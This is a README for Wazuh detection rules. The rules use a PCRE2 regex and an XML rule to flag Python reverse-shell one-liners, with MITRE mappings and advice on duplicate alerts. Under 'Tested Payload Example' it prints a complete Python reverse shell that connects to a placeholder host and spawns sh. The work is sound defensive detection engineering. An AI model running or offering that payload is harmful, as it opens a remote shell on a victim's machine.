# Wazuh – Python Reverse Shell Detection (PCRE2)

This repository contains **high-confidence Wazuh detection rules** designed to identify **Python-based reverse shells** using **PCRE2** pattern matching.

The rules are built to detect **behavior**, not static indicators (IP, port, variable names), making them resilient against evasion techniques.

---

## 🎯 Detection Goal

Detect malicious Python one-liners that establish a **reverse shell** by combining:

- `python` / `python3`
- `socket.socket`
- `connect(...)`
- `os.dup2(...)` (STDIN/STDOUT/STDERR redirection)
- `pty.spawn("sh" | "bash")`

These primitives together indicate an **interactive reverse shell** with very high confidence.

---

## 🧠 Why Behavior-Based Detection?

Static indicators such as:
- `RHOST` / `RPORT`
- IP addresses
- Port numbers
- Variable names

are **not reliable**, as attackers can change them freely.

This ruleset focuses on **execution primitives that cannot be removed** without breaking the reverse shell.

---

## 🧩 Covered Payload Variants

The detection covers common variants such as:

- `python` and `python3`
- Inline execution using `-c`
- Different import orders
- Use of environment variables (`os.getenv`)
- Explicit `dup2(0,1,2)` or loop-based redirection
- `pty.spawn("sh")` or `pty.spawn("bash")`

---

## 🔍 PCRE2 Detection Pattern (High Confidence)

```regex
(?is)\bpython(?:3)?\b[\s\S]*?\bsocket\.socket\b[\s\S]*?\bconnect\s*\([\s\S]*?\)[\s\S]*?\bos\.dup2\s*\([\s\S]*?\)[\s\S]*?\bpty\.spawn\s*\(\s*["'](?:sh|bash)["']\s*\)
```

---

## 🛡 Example Wazuh Rule

```xml
<group name="linux,process,command,reverse_shell,python,">
  <rule id="100620" level="12">
    <description>Python reverse shell detected (socket + connect + dup2 + pty.spawn)</description>
    <field name="full_log" type="pcre2">
      (?is)\bpython(?:3)?\b[\s\S]*?\bsocket\.socket\b[\s\S]*?\bconnect\s*\([\s\S]*?\)[\s\S]*?\bos\.dup2\s*\([\s\S]*?\)[\s\S]*?\bpty\.spawn\s*\(\s*["'](?:sh|bash)["']\s*\)
    </field>
    <mitre>
      <id>T1059.006</id>
      <id>T1105</id>
    </mitre>
  </rule>
</group>
```

> ⚠️ Replace `full_log` with the correct field for your environment  
> (e.g. `data.audit.execve.a2`, `data.command`, etc.)

---

## 🚨 Duplicate Alerts (Important)

When using **auditd / execve**, a single command execution may generate **multiple events**, resulting in duplicate alerts.

### Recommended Mitigations:
- Match only the argument containing the Python `-c` payload
- Or correlate multiple low-level rules into a single high-level alert
- Avoid matching the entire aggregated `full_log` when possible

---

## 🧪 Tested Payload Example

```bash
export RHOST="10.10.10.10";export RPORT=9001;
python -c 'import socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("sh")'
```

---

## 🎯 MITRE ATT&CK Coverage

- **T1059.006** – Command and Scripting Interpreter: Python
- **T1105** – Ingress Tool Transfer / Command-and-Control

---

## ✅ Confidence Level

| Rule Type | False Positives | Reliability |
|---------|----------------|-------------|
| python + socket + connect | High | ❌ Low |
| + os.dup2 | Medium | ⚠️ Moderate |
| + pty.spawn | Very Low | ✅ High |

This ruleset targets the **highest confidence tier**.

---

## ⚠️ Disclaimer

This repository is intended for:
- Defensive security
- Detection engineering
- SOC operations
- Blue team / DFIR use

It does **not** provide offensive payloads.

---

## 👤 Author

Maintained for defensive detection engineering and Wazuh rule development.

---

## 📜 License

MIT License
